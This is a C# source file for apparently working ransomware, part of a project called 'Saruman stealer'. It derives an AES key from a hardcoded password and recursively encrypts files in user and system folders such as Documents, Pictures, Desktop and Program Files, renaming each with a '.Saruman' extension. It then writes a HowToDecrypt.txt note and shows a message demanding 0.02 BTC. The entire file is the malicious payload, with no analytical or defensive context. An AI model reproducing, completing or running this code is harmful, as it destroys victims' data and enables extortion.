using Saruman.Utilies.CryptoGrafy;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows;

namespace Saruman.Ransomware
{
    class RansomwareCrypt
    {
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }
        public static string PasswordEncrypt = "ugsojfsoejoigjwpfdsfmisofjksepfselfs[gkreopf";
            public static  byte[] RidjinEncrypt(byte[] byte_0)
            {
                byte[] result = null;
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
                    {
                        rijndaelManaged.KeySize = 256;
                        rijndaelManaged.BlockSize = 128;
                        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(PasswordEncrypt), Encoding.ASCII.GetBytes(PasswordEncrypt), 1000);
                        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                        rijndaelManaged.Mode = CipherMode.CBC;
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(byte_0, 0, byte_0.Length);
                            cryptoStream.Close();
                        }
                        result = memoryStream.ToArray();
                    }
                }
                return result;
            }

            public static void EncryptFiles(string string_1)
            {
                try
                {
                    try
                    {
                        if (new FileInfo(string_1).Length <= 4096L)
                        {
                            byte[] bytes = RidjinEncrypt(File.ReadAllBytes(string_1));
                            File.WriteAllBytes(string_1, bytes);
                            File.Move(string_1, string_1 + ".Saruman");
                        }
                        else if (new FileInfo(string_1).Length <= 30000000L)
                        {
                            byte[] array = new byte[8192];
                            using (BinaryReader binaryReader = new BinaryReader(File.Open(string_1, FileMode.Open)))
                            {
                                byte[] array2 = RidjinEncrypt(binaryReader.ReadBytes(4096));
                                Array.Copy(array2, array, array2.Length);
                            }
                            using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_1, FileMode.Open)))
                            {
                                binaryWriter.Write(array);
                            }
                            File.Move(string_1, string_1 + ".Saruman");
                        }
                    }
                    catch (Exception)
                    {
                        FileAttributes fileAttributes = File.GetAttributes(string_1);
                        if ((fileAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                        {
                            fileAttributes = fileAttrib(fileAttributes, FileAttributes.ReadOnly);
                            File.SetAttributes(string_1, fileAttributes);
                        }
                        if (new FileInfo(string_1).Length <= 4096L)
                        {
                            byte[] bytes2 =RidjinEncrypt(File.ReadAllBytes(string_1));
                            File.WriteAllBytes(string_1, bytes2);
                            File.Move(string_1, string_1 + ".Saruman");
                        }
                        else if (new FileInfo(string_1).Length <= 30000000L)
                        {
                            byte[] buffer = new byte[8192];
                            using (BinaryReader binaryReader2 = new BinaryReader(File.Open(string_1, FileMode.Open)))
                            {
                                buffer = RidjinEncrypt(binaryReader2.ReadBytes(4096));
                            }
                            using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_1, FileMode.Open)))
                            {
                                binaryWriter2.Write(buffer);
                            }
                            File.Move(string_1, string_1 + ".Saruman");
                        }
                    }
                }
                catch (Exception)
                {
                }
            }

            public static  FileAttributes fileAttrib(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1)
            {
                return fileAttributes_0 & ~fileAttributes_1;
            }

            public static void GetFile(string string_1)
            {
                try
                {
                    string[] files = Directory.GetFiles(string_1);
                    string[] directories = Directory.GetDirectories(string_1);
                    for (int i = 0; i < files.Length; i++)
                    {
                        if (!Path.GetExtension(files[i]).Contains("Saruman"))
                        {
                            EncryptFiles(files[i]);
                        }
                    }
                    for (int j = 0; j < directories.Length; j++)
                    {
                        GetFile(directories[j]);
                    }
                }
                catch (Exception)
                {
                }
            }


            internal void Start()
            {
              
        }

        internal static void start()
        {

           
            if (!File.Exists(Environment.GetEnvironmentVariable("ProgramData") + "\\trig"))
                {
                    string[] array = new string[]
                {
                Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),

                Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                Environment.GetFolderPath(Environment.SpecialFolder.Personal),
                Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                                                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                                                                                                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),





                };
                    for (int i = 0; i < array.Length; i++)
                    {
                        GetFile(array[i]);
                    }
              
                }
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt", "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Saruman stealer:" + crypt.AESDecript(Settings.Stealer_version) + "\nTo Decrypt: \n - Send 0.02 BTC to: " + crypt.AESDecript(Settings.bitcoin_keshel) + "\n- Follow All Steps", Encoding.UTF8);
            Thread.Sleep(2000);
            MessageBox.Show("IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Saruman stealer: " + crypt.AESDecript(Settings.Stealer_version) + "\nTo Decrypt: \n - Send 0.02 BTC to: " + crypt.AESDecript(Settings.bitcoin_keshel) + "\n - Follow All Steps");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)  + "\\HowToDecrypt.txt");
        }
        }
    }


    
